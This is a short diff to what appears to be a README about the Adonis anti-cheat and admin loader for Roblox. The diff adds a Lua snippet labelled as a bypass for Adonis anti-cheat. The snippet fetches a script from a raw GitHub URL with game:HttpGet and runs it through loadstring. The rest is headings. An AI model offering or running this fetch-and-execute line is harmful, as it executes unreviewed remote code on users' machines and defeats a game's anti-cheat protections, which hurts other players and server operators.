@@ -1,3 +1,9 @@
+# Script:
+```lua
+-- Bypass Adonis Anti-cheat
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/robloxarchives/Roblox-Debug-Scripts/main/Adonis-Bypass/Original'),true))()
+```
+
 # 🧩 Adonis Anti-Cheat & Admin Loader References
 
 ### 👤 Credits
